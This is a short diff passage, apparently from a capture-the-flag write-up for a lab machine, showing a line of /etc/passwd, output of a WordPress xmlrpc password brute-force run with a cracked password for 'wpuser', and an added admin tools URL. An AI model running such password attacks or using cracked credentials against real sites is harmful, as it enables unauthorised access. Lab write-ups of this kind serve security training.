@@ -303,7 +303,8 @@ ubuntu:x:1005:1008:Ubuntu:/home/ubuntu:/bin/bash
 [+] Performing password attack on Xmlrpc against 6 user/s
 [SUCCESS] - wpuser / kbLSF2Vop#lw3rjDZ629*Z%G              
 
-
+get access
+http://www.smol.thm/wp-admin/tools.php
 
 <\code>
 
